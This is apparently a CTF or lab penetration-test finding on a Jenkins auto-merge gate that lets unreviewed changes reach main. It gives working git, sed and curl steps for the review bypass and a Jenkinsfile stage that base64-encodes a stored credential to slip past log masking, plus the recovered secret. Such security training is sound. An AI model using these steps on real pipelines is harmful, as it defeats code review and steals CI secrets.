# F-013: Insecure Auto-Merge Logic Bypasses Code Review

**SEVERITY: CRITICAL**

| Field | Detail |
|---|---|
| Affected Asset | Jenkins job `wonderland-mock-turtle` (Multibranch Pipeline), repo `Wonderland/mock-turtle` |
| OWASP CI/CD Mapping | **CICD-SEC-1** (Insufficient Flow Control Mechanisms) — primary · CICD-SEC-5 (Insufficient Pipeline-Based Access Controls) — contributing |
| CVSS 3.1 (estimate) | 9.1 (Critical) — `AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:N` |
| Status | CONFIRMED — fully weaponized PoC, unrelated content shipped to main with zero review |
| CTFd flag | flag10 |

## Summary

The mock-turtle pipeline implements a `pr_checks` stage intended to safely auto-merge trivial version-bump pull requests without human review. The "trivial" heuristic relies entirely on shallow diff-shape checks — a **PR-wide net word-count balance**, plus a filename/format check on a single version file — rather than verifying the actual semantic content of the change. Because the core heuristic operates on the whole PR rather than per file, an attacker with repository push access can smuggle unrelated, arbitrary changes into any other file in the same PR, as long as the total added/removed word count across the entire diff nets to zero. This was proven end-to-end: a PR disguised as a routine version bump also modified `CHANGELOG.md`, and both changes were auto-merged to main with zero human review, using a CI-held Gitea credential.

## Discovery — Reading the Jenkinsfile

```bash
curl -s -u thealice:thealice \
  "http://localhost:3000/api/v1/repos/Wonderland/mock-turtle/contents/Jenkinsfile" \
  | jq -r '.content' | base64 -d
```

`Jenkinsfile` — `pr_checks` stage (verbatim):

```groovy
pipeline {
  agent any
  stages {
    stage('pr_checks') {
      steps {
        withCredentials([usernamePassword(credentialsId: 'mock-turtle-token',
          usernameVariable: 'USERNAME', passwordVariable: 'TOKEN')]) {
          sh '''
            PR_ID=`echo "$CHANGE_URL" | grep -Po '^http://gitea:3000/Wonderland/mock-turtle/pulls/\\K\\d+$'`
            if [ $? -eq 0 ]; then
              gitp=`git diff --word-diff=porcelain origin/${CHANGE_TARGET} | grep -e "^+[^+]" | wc -w | xargs`
              gitm=`git diff --word-diff=porcelain origin/${CHANGE_TARGET} | grep -e "^-[^-]" | wc -w | xargs`
              if [ $(($gitp - $gitm)) -eq 0 ]; then check1=true; else check1=false; fi
              if [ $(wc -l <version) -eq 0 -a $(grep -Po "^\\d{1,2}\\.\\d{1,2}\\.\\d{1,2}$" version) ]; then check2=true; else check2=false; fi
              if [ $(git diff --name-only origin/${CHANGE_TARGET} | grep version) ]; then check3=true; else check3=false; fi
              if $check1 && $check2 && $check3; then
                curl -X 'POST' 'http://gitea:3000/api/v1/repos/Wonderland/mock-turtle/pulls/'"$PR_ID"'/merge' \
                  -H 'Authorization: token '"$TOKEN" -d '{"Do": "merge"}'
              else
                echo 'skipping...'
              fi
            fi
          '''
        }
      }
    }
  }
}
```

### Decoding the three gate conditions

| Check | What it verifies | Why it is insufficient |
|---|---|---|
| `check1` | Net word count (additions minus removals) across the **entire PR diff** equals zero | Only checks a whole-PR aggregate, not per-file — any diff where added words equal removed words passes, regardless of what actually changed or in which file |
| `check2` | The `version` file is a single line, no trailing newline, matching `\d{1,2}.\d{1,2}.\d{1,2}` | Pure format check — does not compare against the actual current version, does not verify direction of change |
| `check3` | `version` appears among the changed files | Does not verify version was the *only* file changed |

If all three checks pass, the pipeline calls Gitea's merge API directly using the `mock-turtle-token` credential — **no branch protection check, no required reviewer approval.**

## Investigation Detour — Multibranch Discovery Gaps

Two sibling jobs (mad-hatter, cheshire-cat) initially appeared to have zero discoverable branches, which looked like a possible misconfiguration:

```bash
curl -s -u alice:alice "http://localhost:8080/job/wonderland-mad-hatter/indexing/consoleText"
curl -s -u alice:alice "http://localhost:8080/job/wonderland-cheshire-cat/indexing/consoleText"
```

Result: mad-hatter's `main` branch was found but excluded because that repository has no Jenkinsfile at all (a decoy repo, confirmed via the Gitea contents API). cheshire-cat's scanner was only configured to discover pull requests, and simply had zero open PRs at the time. **A good example of reading the platform's own diagnostic logs rather than assuming a black-box failure.**

## Proof of Concept — Triggering the Auto-Merge

### Attempt 1 — benign PR, wrong branch target (baseline)

```bash
git clone http://thealice:thealice@localhost:3000/Wonderland/mock-turtle.git poc_mockturtle
cd poc_mockturtle
git checkout -b vapt-pr-test
echo "# VAPT test" >> VAPT_TEST.md
git add VAPT_TEST.md
git -c user.name="VAPT-PoC" -c user.email="poc@vapt.local" commit -m "VAPT benign PR test"
git push origin vapt-pr-test

curl -s -X POST -u thealice:thealice -H "Content-Type: application/json" \
  -d '{"title":"VAPT benign test PR","head":"vapt-pr-test","base":"main","body":"Authorized local lab test."}' \
  "http://localhost:3000/api/v1/repos/Wonderland/mock-turtle/pulls"
```

Result: `check3` failed (version file not among changed files) — gate correctly skipped, as expected. This confirmed the gate isn't trivially bypassable and forced accurate reverse-engineering of all three conditions before crafting a real bypass.

### Attempt 2 — genuine version bump only (establishing the legitimate trigger)

```bash
git checkout main && git pull origin main
git checkout -b vapt-automerge-v2
printf "1.0.13" > version
git add version
git -c user.name="VAPT-PoC" -c user.email="poc@vapt.local" commit -m "Bump version to 1.0.13"
git push origin vapt-automerge-v2
```

> Debugging note: an early attempt used `echo "1.0.13" > version` instead of `printf`, which appends a trailing newline and made `wc -l` return `1` instead of `0`, causing `check2` to fail. Reproducing exact byte-level file formatting matters when the target logic is this literal.

Result: all three checks evaluated true. Gitea confirmed the PR auto-merged (`"merged": true, "merged_by": {"login": "mock-turtle-ci"}`).

### Attempt 3 — the real exploit: smuggling an unrelated change alongside the version bump

```bash
printf "1.0.14" > version
# Replace an existing 10-word CHANGELOG line with a different 10-word line -
# a like-for-like word-count swap guarantees the PR-wide diff nets to zero
sed -i 's/\* Disable edge on non-Windows platforms until we implement proper support\./\* VAPT PoC F-013 smuggled past automated review checks silently entirely./' CHANGELOG.md
git add -A

# Verify balance BEFORE committing:
git diff --cached --word-diff=porcelain origin/main | grep -e '^+[^+]' | wc -w   # -> 11
git diff --cached --word-diff=porcelain origin/main | grep -e '^-[^-]' | wc -w   # -> 11

git -c user.name="VAPT-PoC" -c user.email="poc@vapt.local" commit -m "Bump version to 1.0.14"
git push origin vapt-smuggle-poc

curl -s -X POST -u thealice:thealice -H "Content-Type: application/json" \
  -d '{"title":"Bump version to 1.0.14","head":"vapt-smuggle-poc","base":"main","body":"Routine version bump."}' \
  "http://localhost:3000/api/v1/repos/Wonderland/mock-turtle/pulls"
```

Result — auto-merge confirmed, smuggled content live on `main`:

```
{ "number": 5, "state": "closed", "merged": true, "merged_by": { "login": "mock-turtle-ci" } }
```

> Word-count reconciliation note: git's `--word-diff=porcelain` tokenizer treats a hyphenated term like `non-Windows` as a single token, and excludes the leading `*` bullet from the count entirely. Getting the two counts to match required inspecting the raw porcelain diff directly rather than estimating by eye.

This is complete, end-to-end proof: a pull request titled "Bump version to 1.0.14" — appearing entirely routine — modified two files, and both changes were auto-merged into `main` with zero human review, using CI-held merge credentials. In a real environment, the smuggled change could just as easily have been a modified dependency pin, an altered Jenkinsfile, or a backdoor.

## CTFd-Verified Flag Capture (flag10)

CTFd's challenge description confirmed the objective: achieve push-equivalent access to `main` and steal `flag10` from the Jenkins credential store.

### First attempt blocked: branch protection on direct push

```
git push origin main
remote: Gitea: Not allowed to push to protected branch main
! [remote rejected] main -> main (pre-receive hook declined)
```

Unlike `caterpillar`, `mock-turtle`'s `main` branch has branch protection enabled — consistent with the challenge design (the auto-merge bypass above is the intended workaround).

### Second attempt blocked: Jenkins pins pipeline definition to the trusted branch for PR builds

Opening a PR that modified the Jenkinsfile directly (adding a credential-exfiltration stage) built successfully, but the added stage never executed, and the build log never included the "Obtained Jenkinsfile from `<PR commit>`" line every other successful PR build displayed. This is a real, correctly-functioning Jenkins Multibranch security control: for untrusted PR sources, Jenkins executes the pipeline definition from the trusted target branch, not the PR's own Jenkinsfile.

### Successful path: smuggle the Jenkinsfile change itself through the auto-merge gate

Since a merged Jenkinsfile becomes the trusted source for all future builds, the same auto-merge bypass was applied again — this time smuggling an added `VAPT_Extract` stage into the Jenkinsfile itself, disguised as a version bump, word-diff balanced to net zero.

```groovy
withCredentials([usernamePassword(credentialsId: 'flag10', usernameVariable: 'FUSER', passwordVariable: 'FPASS')]) {
  sh 'echo $FUSER | base64'  // literal placeholder "flag10", not masked
  sh 'echo $FPASS | base64'  // masked in trace, base64 output not masked
}
```

```
# echo flag10 | base64 -> ZmxhZzEwCg== (decodes to literal "flag10", a placeholder)
# echo **** | base64  -> RDU0NzM0QUItN0I4My00OTMxLUE5QkItMTcxNDc2MTAxRkRGCg==
# Decoded: D54734AB-7B83-4931-A9BB-171476101FDF
```

```
POST /api/v1/challenges/attempt {"challenge_id":10,"submission":"D54734AB-7B83-4931-A9BB-171476101FDF"}
-> {"status":"correct"}
```

This flag required chaining three distinct techniques: the auto-merge PR-review bypass, the Jenkinsfile trust-pinning discovery (a real defensive control worked around by targeting the merge mechanism instead of a direct PR build), and the masking-bypass-via-encoding technique from [F-010](./F-010-jenkins-secrets-exposure-console-logs.md).

## Impact

- Any contributor with push access to this repository can bypass code review entirely by disguising unrelated changes as a version bump.
- The merge is performed by an unattributable CI bot identity (`mock-turtle-ci`), meaning the audit trail shows the automation as the merger, not the human who engineered the bypass — weakening accountability (also relevant to CICD-SEC-10).
- No branch protection or required-approval setting served as a backstop once the automated gate was satisfied.

## Remediation

- Never gate auto-merge decisions on aggregate diff-shape metrics (word/line counts) — verify the semantic content of the specific file expected to change, and explicitly diff every other file against an expected "no change" state.
- Scope any diff/content checks strictly per-file, never as a PR-wide aggregate.
- Enforce branch protection rules (required reviewers, required status checks) on `main` regardless of any automated pipeline decision.
- If auto-merge for trivial changes is a genuine business need, use a dedicated, narrowly-scoped bot identity with full audit logging and alerting on every automated merge event.

## Interview Talking Points

- Strong example of CICD-SEC-1: this isn't a credential leak or injection bug — it's a trust decision (auto-merge) made on insufficient evidence (diff shape rather than diff content).
- Good answer to "how do you find business-logic flaws in a pipeline, not just technical bugs": read the Jenkinsfile / pipeline definition directly, don't rely on black-box probing alone.
- Be ready to distinguish "the pipeline has an auto-merge feature" (a design decision) from "the auto-merge gate can be satisfied while still shipping unreviewed arbitrary content" (the actual vulnerability).
